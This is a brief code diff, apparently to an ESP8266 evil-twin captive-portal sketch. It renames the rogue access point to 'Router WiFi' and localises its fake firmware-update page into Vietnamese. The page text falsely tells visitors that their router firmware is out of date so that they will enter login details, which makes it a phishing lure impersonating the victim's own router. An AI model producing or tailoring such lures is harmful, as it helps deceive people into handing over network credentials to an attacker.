@@ -8,10 +8,10 @@
 #include <EEPROM.h>
 
 // Default SSID name
-const char* SSID_NAME = "Free WiFi";
+const char* SSID_NAME = "Router WiFi";
 
 // Default main strings
-#define SUBTITLE "Router info."
+#define SUBTITLE "Thông Tin Đăng Nhập."
 #define TITLE "Update"
 #define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
 #define POST_TITLE "Updating..."
